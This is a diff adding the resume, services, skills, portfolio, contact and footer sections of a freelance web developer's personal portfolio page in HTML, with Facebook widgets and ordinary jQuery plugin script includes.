+                                        </div><!-- /timeline-body -->
+                                    </div> <!-- /timeline-content -->
+                                </div> <!-- /timeline-panel -->
+                            </li>
+
+                            <li>
+                                <div class="posted-date">
+                                  <span class="month">2016-Current</span>
+                                </div><!-- /posted-date -->
+
+                                <div class="timeline-panel wow fadeInUp" style="visibility: visible; animation-name: fadeInUp;">
+                                    <div class="timeline-content">
+                                        <div class="timeline-heading">
+                                            <h3>Laravel Application Development</h3>
+                                            <span>Freelance, Fiver</span>
+                                        </div><!-- /timeline-heading -->
+
+                                        <div class="timeline-body">
+                                            <p>Completely provide access to seamless manufactured products before functionalized synergy. Progressively redefine competitive.</p>
+                                        </div><!-- /timeline-body -->
+                                    </div> <!-- /timeline-content -->
+                                </div><!-- /timeline-panel -->
+                            </li>
+
+                            <li class="timeline-inverted">
+                                <div class="posted-date">
+                                  <span class="month">2016-Current</span>
+                                </div><!-- /posted-date -->
+
+                                <div class="timeline-panel wow fadeInUp" style="visibility: visible; animation-name: fadeInUp;">
+                                    <div class="timeline-content">
+                                        <div class="timeline-heading">
+                                            <h3>Graphics and Web Design</h3>
+                                            <span>Freelance, Fiver</span>
+                                        </div><!-- /timeline-heading -->
+
+                                        <div class="timeline-body">
+                                            <p>Completely provide access to seamless manufactured products before functionalized synergy. Progressively redefine competitive.</p>
+                                        </div><!-- /timeline-body -->
+                                    </div> <!-- /timeline-content -->
+                                </div><!-- /timeline-panel -->
+                            </li>
+
+                            <li class="">
+                                <div class="posted-date">
+                                  <span class="month">2018-Current</span>
+                                </div><!-- /posted-date -->
+
+                                <div class="timeline-panel wow fadeInUp" style="visibility: visible; animation-name: fadeInUp;">
+                                    <div class="timeline-content">
+                                        <div class="timeline-heading">
+                                            <h3>Back-End App Developer of 10 Minute School</h3>
+                                            <span>10 Minute School</span>
+                                        </div><!-- /timeline-heading -->
+
+                                        <div class="timeline-body">
+                                            <p>I'm a Back-End web application Developer of 10 minute schol. And notice about mistakes to get become a better platform ever. I really love this platform.</p>
+                                        </div><!-- /timeline-body -->
+                                    </div> <!-- /timeline-content -->
+                                </div><!-- /timeline-panel -->
+                            </li>
+
+                        </ul>
+                    </div>
+                </div>
+            </div><!-- /row -->
+        </div><!-- /.container -->
+    </section><!-- End Resume Section -->
+
+<section id="service" class="service-section section-padding">
+      <div class="container">
+        <h2 class="section-title wow fadeInUp animated" style="visibility: visible; animation-name: fadeInUp;">Service</h2>
+        <div class="row service-wrap">
+          <div class="col-sm-6 col-md-3">
+            <div class="service-box">
+              <i class="fa fa-leaf"></i>
+              <h3>UI Design</h3>
+            </div><!-- /.service-box -->
+          </div><!-- /.col-md-3 -->
+          <div class="col-sm-6 col-md-3">
+            <div class="service-box">
+              <i class="fa fa-paint-brush"></i>
+              <h3>GRAPHIC DESIGN</h3>
+            </div><!-- /.service-box -->
+          </div><!-- /.col-md-3 -->
+          <div class="col-sm-6 col-md-3">
+            <div class="service-box">
+              <i class="fa fa-paper-plane"></i>
+              <h3>BRANDING DESIGN</h3>
+            </div><!-- /.service-box -->
+          </div><!-- /.col-md-3 -->
+          <div class="col-sm-6 col-md-3">
+            <div class="service-box">
+              <i class="fa fa-desktop"></i>
+              <h3>WEB DESIGN</h3>
+            </div><!-- /.service-box -->
+          </div><!-- /.col-md-3 -->
+        </div><!-- /.row -->
+      </div><!-- /.container -->
+    </section>
+    <!-- Skills Section -->
+    <section id="skills" class="skills-section section-padding">
+      <div class="container">
+        <h2 class="section-title wow fadeInUp" style="visibility: visible; animation-name: fadeInUp;">Skills</h2>
+
+        <div class="row">
+          <div class="col-md-6">
+            <div class="skill-progress">
+              <div class="skill-title"><h3>UX Design</h3></div>
+              <div class="progress">
+                <div class="progress-bar six-sec-ease-in-out" role="progressbar" aria-valuenow="75" aria-valuemin="0" aria-valuemax="100" ><span>75%</span>
+                </div>
+              </div><!-- /.progress -->
+            </div><!-- /.skill-progress -->
+
+            <div class="skill-progress">
+              <div class="skill-title"><h3>Visual Design</h3></div>
+              <div class="progress">
+                <div class="progress-bar six-sec-ease-in-out" role="progressbar" aria-valuenow="60" aria-valuemin="0" aria-valuemax="100" ><span>60%</span>
+                </div>
+              </div><!-- /.progress -->
+            </div><!-- /.skill-progress -->
+            <div class="skill-progress">
+              <div class="skill-title"><h3>Web Develop</h3></div>
+              <div class="progress">
+                <div class="progress-bar six-sec-ease-in-out" role="progressbar" aria-valuenow="95" aria-valuemin="0" aria-valuemax="100" ><span>95%</span>
+                </div>
+              </div><!-- /.progress -->
+            </div><!-- /.skill-progress -->
+          </div><!-- /.col-md-6 -->
+
+          <div class="col-md-6">
+            <div class="skill-progress">
+              <div class="skill-title"><h3>Web Design</h3></div>
+              <div class="progress">
+                <div class="progress-bar six-sec-ease-in-out" role="progressbar" aria-valuenow="95" aria-valuemin="0" aria-valuemax="100" ><span>95%</span>
+                </div>
+              </div><!-- /.progress -->
+            </div><!-- /.skill-progress -->
+            <div class="skill-progress">
+              <div class="skill-title"><h3>Motion Graphic</h3></div>
+              <div class="progress">
+                <div class="progress-bar six-sec-ease-in-out" role="progressbar" aria-valuenow="60" aria-valuemin="0" aria-valuemax="100" ><span>60%</span>
+                </div>
+              </div><!-- /.progress -->
+            </div><!-- /.skill-progress -->
+            <div class="skill-progress">
+              <div class="skill-title"><h3>Flyers Designing</h3></div>
+              <div class="progress">
+                <div class="progress-bar six-sec-ease-in-out" role="progressbar" aria-valuenow="80" aria-valuemin="0" aria-valuemax="100" ><span>80%</span>
+                </div>
+              </div><!-- /.progress -->
+            </div><!-- /.skill-progress -->
+          </div><!-- /.col-md-6 -->
+        </div><!-- /.row -->
+
+        <div class="skill-chart text-center">
+          <h3>More skills</h3>
+        </div>
+
+        <div class="row more-skill text-center">
+          <div class="col-xs-12 col-sm-4 col-md-2">
+              <div class="chart" data-percent="80" data-color="e74c3c">
+                    <span class="percent"></span>
+                    <div class="chart-text">
+                      <span>leadership</span>
+                    </div>
+                </div>
+            </div>
+            <div class="col-xs-12 col-sm-4 col-md-2">
+              <div class="chart" data-percent="85" data-color="2ecc71">
+                    <span class="percent"></span>
+                    <div class="chart-text">
+                      <span>Creativity</span>
+                    </div>
+                </div>
+            </div>
+            <div class="col-xs-12 col-sm-4 col-md-2">
+              <div class="chart" data-percent="65" data-color="3498db">
+                    <span class="percent"></span>
+                    <div class="chart-text">
+                      <span>Management</span>
+                    </div>
+                </div>
+            </div>
+            <div class="col-xs-12 col-sm-4 col-md-2">
+              <div class="chart" data-percent="80" data-color="3498db">
+                    <span class="percent"></span>
+                    <div class="chart-text">
+                      <span>Branding</span>
+                    </div>
+                </div>
+            </div>
+            <div class="col-xs-12 col-sm-4 col-md-2">
+              <div class="chart" data-percent="85" data-color="3498db">
+                    <span class="percent"></span>
+                    <div class="chart-text">
+                      <span>Marketing</span>
+                    </div>
+                </div>
+            </div>
+            <div class="col-xs-12 col-sm-4 col-md-2">
+              <div class="chart" data-percent="75" data-color="3498db">
+                    <span class="percent"></span>
+                    <div class="chart-text">
+                      <span>Motivation</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+      </div><!-- /.container -->
+    </section><!-- End Skills Section -->
+
+
+    <!-- Works Section -->
+    <section id="works" class="works-section section-padding">
+      <div class="container">
+        <h2 class="section-title wow fadeInUp" style="visibility: visible; animation-name: fadeInUp;">Works</h2>
+
+        <ul class="list-inline" id="filter">
+            <li><a class="active" data-group="all">All</a></li>
+            <li><a data-group="design">Design</a></li>
+            <li><a data-group="web">Web</a></li>
+            <li><a data-group="interface">Interface</a></li>
+            <li><a data-group="identety">Identity</a></li>
+        </ul>
+
+        <div class="row">
+          <div id="grid">
+            <div class="portfolio-item col-xs-12 col-sm-4 col-md-3" data-groups='["all", "design", "web"]'>
+              <div class="portfolio-bg">
+                <div class="portfolio">
+                  <div class="tt-overlay"></div>
+                  <div class="links">
+                    <a class="image-link" href="http://photouploads.com/images/caa3df.png"><i class="fa fa-search-plus"></i></a>
+                    <a href="#"><i class="fa fa-link"></i></a>
+                  </div><!-- /.links -->
+                  <img src="http://photouploads.com/images/caa3df.png" alt="image">
+                  <div class="portfolio-info">
+                    <h3>WEb design project</h3>
+                  </div><!-- /.portfolio-info -->
+                </div><!-- /.portfolio -->
+              </div><!-- /.portfolio-bg -->
+            </div><!-- /.portfolio-item -->
+
+
+            <div class="portfolio-item col-xs-12 col-sm-4 col-md-3" data-groups='["all", "design", "web"]'>
+              <div class="portfolio-bg">
+                <div class="portfolio">
+                  <div class="tt-overlay"></div>
+                  <div class="links">
+                    <a class="image-link" href="http://photouploads.com/images/62d907.png"><i class="fa fa-search-plus"></i></a>
+                    <a href="https://indurkaninews.com"><i class="fa fa-link"></i></a>
+                  </div><!-- /.links -->
+                  <img src="http://photouploads.com/images/62d907.png" alt="image">
+                  <div class="portfolio-info">
+                    <h3>Indurkaninews.com</h3>
+                  </div><!-- /.portfolio-info -->
+                </div><!-- /.portfolio -->
+              </div><!-- /.portfolio-bg -->
+            </div><!-- /.portfolio-item -->
+            <div class="portfolio-item col-xs-12 col-sm-4 col-md-3" data-groups='["all", "design", "web"]'>
+              <div class="portfolio-bg">
+                <div class="portfolio">
+                  <div class="tt-overlay"></div>
+                  <div class="links">
+                    <a class="image-link" href="http://photouploads.com/images/c9268e.png"><i class="fa fa-search-plus"></i></a>
+                    <a href="https://pirojpursangbad.com/"><i class="fa fa-link"></i></a>
+                  </div><!-- /.links -->
+                  <img src="http://photouploads.com/images/c9268e.png" alt="image">
+                  <div class="portfolio-info">
+                    <h3>PirojpurSangbad.com</h3>
+                  </div><!-- /.portfolio-info -->
+                </div><!-- /.portfolio -->
+              </div><!-- /.portfolio-bg -->
+            </div><!-- /.portfolio-item -->
+            <div class="portfolio-item col-xs-12 col-sm-4 col-md-3" data-groups='["all", "interface", "design", "web"]'>
+              <div class="portfolio-bg">
+                <div class="portfolio">
+                  <div class="tt-overlay"></div>
+                  <div class="links">
+                    <a class="image-link" href="http://photouploads.com/images/e4f13a.png"><i class="fa fa-search-plus"></i></a>
+                    <a href="http://ourmess.tk/"><i class="fa fa-link"></i></a>
+                  </div><!-- /.links -->
+                  <img src="http://photouploads.com/images/e4f13a.png" alt="image">
+                  <div class="portfolio-info">
+                    <h3>Ourmess.tk</h3>
+                  </div><!-- /.portfolio-info -->
+                </div><!-- /.portfolio -->
+              </div><!-- /.portfolio-bg -->
+            </div><!-- /.portfolio-item -->
+
+
+          </div><!-- /#grid -->
+        </div><!-- /.row -->
+      </div><!-- /.container -->
+    </section><!-- End Works Section -->
+
+
+    <!-- Facts Section -->
+    <section id="facts" class="facts-section text-center" data-stellar-vertical-offset="50" data-stellar-background-ratio="0.2">
+      <div class="tt-overlay-bg">
+        <div class="container">
+          <div class="row">
+            <div class="col-md-12">
+              <div class="count-wrap">
+                <div class="col-sm-3 col-xs-6">
+                  <i class="fa fa-flask"></i>
+                  <h3 class="timer">3</h3>
+                  <p>Years of Experience</p>
+                </div>
+                <div class="col-sm-3 col-xs-6">
+                  <i class="fa fa-thumbs-up"></i>
+                  <h3 class="timer">10</h3>
+                  <p>Projects Done</p>
+                </div>
+                <div class="col-sm-3 col-xs-6">
+                  <i class="fa fa-users"></i>
+                  <h3 class="timer">10</h3>
+                  <p>Happy Clients</p>
+                </div>
+                <div class="col-sm-3 col-xs-6">
+                  <i class="fa fa-trophy"></i>
+                  <h3 class="timer">2</h3>
+                  <p>Awards Won</p>
+                </div>
+              </div><!-- /count-wrap -->
+            </div><!-- /.col-md-12 -->
+          </div><!-- /.row -->
+        </div><!-- /.container -->
+      </div>
+    </section> <!-- End Facts Section -->
+
+
+    <!-- Hire Section -->
+    <section class="hire-section text-center" data-stellar-vertical-offset="50" data-stellar-background-ratio="0.2">
+      <div class="hire-section-bg">
+        <div class="container">
+          <div class="row">
+            <div class="col-md-12">
+              <h2>I'm available for freelance project</h2>
+              <a href="#contact" class="btn btn-default">Get Hired</a>
+            </div><!-- /.col-md-12 -->
+          </div><!-- /.row -->
+        </div><!-- /.container -->
+      </div><!-- /.hire-section-bg -->
+    </section><!-- End Hire Section -->
+
+
+
+    <!-- Contact Section -->
+    <section id="contact" class="contact-section section-padding">
+      <div class="container">
+        <h2 class="section-title wow fadeInUp" style="visibility: visible; animation-name: fadeInUp;">Get in touch</h2>
+
+        <div class="row">
+          <div class="col-md-6">
+            <div class="contact-form">
+              <strong>Send me a message</strong>
+              <form name="contact-form" id="contactForm" action="sendemail.php" method="POST">
+
+                <div class="form-group">
+                  <label for="name">Name</label>
+                  <input type="text" name="name" class="form-control" id="name" required="">
+                </div>
+
+                <div class="form-group">
+                  <label for="email">Email</label>
+                  <input type="email" name="email" class="form-control" id="email" required="">
+                </div>
+
+                <div class="form-group">
+                  <label for="subject">Subject</label>
+                  <input type="text" name="subject" class="form-control" id="subject">
+                </div>
+
+                <div class="form-group">
+                  <label for="message">Message</label>
+                  <textarea name="message" class="form-control" id="message" rows="5" required=""></textarea>
+                </div>
+
+                <button type="submit" name="submit" class="btn btn-primary">Send Message</button>
+              </form>
+            </div><!-- /.contact-form -->
+          </div><!-- /.col-md-6 -->
+
+          <div style="text-align:center" class="col-md-6">
+            <div class="row center-xs">
+              <div class="col-sm-6">
+                <i class="fa fa-map-marker"></i>
+                <address>
+                  <strong>Address/Street</strong>
+                  239/2 Azimpur Street,<br>
+                  Dhaka, Bangladesh<br>
+                </address>
+              </div>
+
+              <div class="col-sm-6">
+                <i class="fa fa-mobile"></i>
+                <div class="contact-number">
+                  <strong>Phone Number</strong>
+                  <a href="tel:+8801815651830">+8801815651830</a><br>
+                  <a href="tel:+8801521102547">+8801521102547</a>
+                </div>
+              </div>
+            </div>
+
+
+            <div class="row">
+            <div class="col-sm-12" style="text-align:center">
+
+              <iframe src="https://www.google.com/maps/embed?pb=!1m14!1m12!1m3!1d58443.75026866574!2d90.38061979999999!3d23.72117729999999!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!5e0!3m2!1sen!2sbd!4v1507468010106" width="600" height="450" frameborder="0" style="border:0" allowfullscreen></iframe>
+
+            </div>
+          </div>
+
+
+
+
+<!--
+          <div class="row">
+            <div class="col-sm-12">
+              <div class="location-map">
+                <div id="mapCanvas" class="map-canvas"></div>
+              </div>
+            </div>
+          </div>
+-->
+          </div>
+        </div><!-- /.row -->
+
+
+            <!-- Contact Section -->
+    <section id="contact" class="contact-section section-padding">
+      <div class="container">
+        <h2 class="section-title wow fadeInUp" style="visibility: visible; animation-name: fadeInUp;">Get on Facebook</h2>
+
+<div class="fb-messengermessageus"
+  messenger_app_id="851089505020363"
+  page_id="150520338768134"
+  color="<blue | white>"
+  size="<standard | large | xlarge>">
+</div>
+
+        <div class="row">
+            <div class="col-sm-12 col-md-6" style="text-align:center;">
+
+                <div class="fb-page" data-href="https://www.facebook.com/anwaarulislaam/" data-tabs="timeline, messages, events" data-width="400" data-height="400" data-small-header="false" data-adapt-container-width="true" data-hide-cover="false" data-show-facepile="true"><blockquote cite="https://www.facebook.com/anwaarulislaam/" class="fb-xfbml-parse-ignore"><a href="https://www.facebook.com/anwaarulislaam/">Anwarul Islam</a></blockquote></div>
+
+
+              <div style="padding:15px 0px 0px 0px">
+
+  <!-- Your like button code -->
+  <div class="fb-like" data-href="https://anwarulislam.tk/" data-layout="button_count" data-action="like" data-size="large" data-show-faces="false" data-share="false"></div>
+
+  <!-- Your share button code -->
+  <div class="fb-share-button"
+    data-href="http://anwarulislam.tk/"
+    data-size="large"
+    data-layout="button_count">
+  </div>
+
+    <!-- Your follow button code -->
+   <div class="fb-follow" data-href="https://www.facebook.com/anwarul.bablu" data-layout="button_count" data-size="large" data-show-faces="true">
+    </div>
+
+    <!-- Your send button code -->
+  <div class="fb-send"
+    data-href="http://anwarulislam.tk/"
+    data-size="large"
+    data-layout="button_count">
+  </div>
+
+            </div>
+
+            </div>
+
+            <div style="text-align:center" class="col-sm-12 col-md-6">
+
+                <div class="fb-comments" data-href="http://anwarulislam.tk" data-numposts="5"></div>
+
+
+            </div>
+          </div>
+
+          </div>
+          </section>
+
+      </div><!-- /.container -->
+    </section><!-- End Contact Section -->
+
+
+	<!-- Footer Section -->
+    <footer class="footer-wrapper">
+      <div class="container">
+        <div class="row">
+          <div class="col-md-12">
+            <div class="copyright text-center">
+              <p>&copy; Developed by <a href="https://fb.me/anwarul.bablu">Myself</a></p>
+            </div>
+          </div>
+        </div>
+      </div>
+    </footer><!-- End Footer Section -->
+
+
+
+
+	<!-- Scroll-up -->
+	<div class="scroll-up">
+		<a href="#home"><i class="fa fa-angle-up"></i></a>
+	</div>
+
+	<!-- </div>Javascript files -->
+
+	<script src="assets/bootstrap/js/bootstrap.min.js"></script>
+  <script src="assets/js/jquery.stellar.min.js"></script>
+	<script src="assets/js/jquery.sticky.js"></script>
+  <script src="assets/js/smoothscroll.js"></script>
+	<script src="assets/js/wow.min.js"></script>
+  <script src="assets/js/jquery.countTo.js"></script>
+  <script src="assets/js/jquery.inview.min.js"></script>
+  <script src="assets/js/jquery.easypiechart.js"></script>
+  <script src="assets/js/jquery.shuffle.min.js"></script>
+  <script src="assets/js/jquery.magnific-popup.min.js"></script>
+  <script src="http://a.vimeocdn.com/js/froogaloop2.min.js"></script>
+  <script src="assets/js/jquery.fitvids.js"></script>
+
+  <script src="assets/js/scripts.js"></script>
+  <script>
+var myVar;
+
+function myFunction() {
+    myVar = setTimeout(showPage, 3000);
+}
+
+function showPage() {
+  document.getElementById("loader").style.display = "none";
+  document.getElementById("myDiv").style.display = "block";
+}
+
+
+
+
+</script>
+
+
+
+</body>
+</html>
